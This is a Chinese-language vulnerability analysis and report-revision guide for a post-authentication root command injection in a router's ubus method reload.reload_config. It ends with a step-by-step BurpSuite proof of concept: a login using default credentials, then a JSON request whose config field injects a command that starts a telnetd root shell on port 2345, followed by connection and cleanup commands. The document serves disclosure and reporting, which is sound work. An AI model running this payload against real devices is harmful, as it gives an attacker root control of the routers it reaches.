# `reload.reload_config` Root RCE 分析指导与正式稿修改建议

## 1. 用途

这份文档配套：

- `report/postauth_reload_reload_config_rce_report.md`

这条链和前面 CNVD 里的 `uci + smartwaretrack + reload` 组合链不同，这里是更直接的 `reload.reload_config` 参数注入，需要在正式稿里区分清楚。

## 2. 一句话结论

这条 CVE 不是配置污染链，而是：

```text
/api/esps
  -> magic_link 允许直接访问原始 ubus 对象 reload
  -> 调用 reload.reload_config
  -> config 参数进入 /usr/bin/reload 的命令拼接逻辑
  -> /sbin/config_reload <config> 通过 system 风格执行
  -> 命令注入
```

## 3. 必须和组合链区分开的点

不要把这条漏洞和另一条：

- `uci.add -> smartwaretrack.exec -> reload.reload_config`

混为一谈。

这里的核心不是污染 `smartwaretrack`，而是：

- `reload.reload_config` 本身就把 `config` 当作命令字符串的一部分使用。

## 4. 关键证据

### 4.1 `/api/esps` 可以打到原始 `reload` 对象

`/usr/lib/lua/magic_link/magic_link.lua` 第 `12-25` 行显示：

- `object` 直接映射为 ubus `path`
- `method` 直接映射为 ubus `func`

因此：

```json
{"object":"reload","method":"reload_config",...}
```

会被原样转发。

### 4.2 `/usr/bin/reload` 静态字符串直接暴露危险命令模板

对 `/usr/bin/reload` 提取字符串可见：

- `/sbin/config_reload %s`
- `reload_config`
- `config`
- `method`
- `status`

这与正式稿中的命令拼接结论一致。

### 4.3 `/sbin/config_reload` 是被调用目标

`/sbin/config_reload`：

- `5-8`：从 `smartwaretrack` 读取 `init/exec/affects`
- `20`：`[ -n "$exec" ] && reload_exec "$exec"`
- `27-33`：`reload_exec` 中执行 `$cmd`

虽然这份脚本更多用于另一条组合链，但在本 CVE 中它也说明 `reload` 逻辑最终会落到 shell 命令执行环境。

## 5. 正式稿建议补强点

### 5.1 强调这是 direct injection

建议明确写：

- direct injection in `config`
- no need to first pollute any UCI section

### 5.2 把 `status=1` 的作用写清

PoC 使用 `status=1` 是为了走立即执行路径，便于稳定复现。报告里最好补这一点。

## 6. 建议补充的验证内容

1. 登录拿 session；
2. 调用 `reload.reload_config`；
3. `config` 放入 `x;...;#` 风格 payload；
4. 连接临时 `telnetd` 证明 root。

## 7. 建议结论写法

> This CVE is a direct command injection in the exposed ubus method `reload.reload_config`; it does not rely on any prior configuration pollution and is independently exploitable once an authenticated web session is available.

## 8. BurpSuite 逐步复现

约定：

- 目标：`192.168.8.1`
- 默认账号：`admin / admin123`
- 临时 shell 端口：`2345`

### 8.1 包 1：登录获取 session

```http
POST /api/login/auth HTTP/1.1
Host: 192.168.8.1
User-Agent: Mozilla/5.0
Accept: application/json, text/plain, */*
Content-Type: application/json
Connection: close

{"username":"admin","password":"admin123"}
```

从响应里取：

- `data.session`

后续所有 `/api/esps` 包都写：

- `AUTHENTICATION: <SESSION>`

### 8.2 包 2：直接触发 `reload.reload_config`

这里的核心是 `config` 字段本身就是注入点。

```http
POST /api/esps HTTP/1.1
Host: 192.168.8.1
User-Agent: Mozilla/5.0
Accept: application/json, text/plain, */*
Content-Type: application/json
AUTHENTICATION: <SESSION>
Connection: close

[{"id":1,"object":"reload","method":"reload_config","param":{"config":"x;echo RELOAD_RCE_OK>/tmp/reload_rce_marker;telnetd -p2345 -l /bin/sh;#","method":"reload","status":1}}]
```

### 8.3 第 3 步：连接 shell 验证 root

```bash
telnet 192.168.8.1 2345
```

或：

```bash
nc 192.168.8.1 2345
```

执行：

```sh
id
uname -a
cat /tmp/reload_rce_marker
```

预期：

```text
uid=0(root)
RELOAD_RCE_OK
```

### 8.4 清理 shell

在 shell 里执行：

```sh
ps w | grep 'telnetd -p2345'
kill <PID>
```

### 8.5 备注

如果你想验证排队路径，也可以把上面包里的：

- `"status":1`

改成：

- `"status":0`

但实机复现时建议先用 `status=1`，更直接。
